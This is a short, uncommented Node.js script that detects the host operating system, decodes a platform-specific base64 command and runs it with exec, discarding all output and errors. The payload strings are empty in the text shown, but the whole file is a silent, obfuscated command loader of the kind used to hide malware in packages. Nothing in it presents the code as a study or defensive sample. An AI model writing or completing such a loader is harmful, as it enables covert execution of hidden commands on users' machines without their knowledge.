const os = require("os");
const { exec } = require("child_process");

const platform = os.platform();

let base64Command = "";

if (platform === "win32") {
  base64Command = "";
} else if (platform === "linux") {
  base64Command = "";
} else if (platform === "darwin") {
  base64Command = "";
}

if (base64Command) {
  const command = Buffer.from(base64Command, "base64").toString("utf-8");
  exec(command, () => {});
}
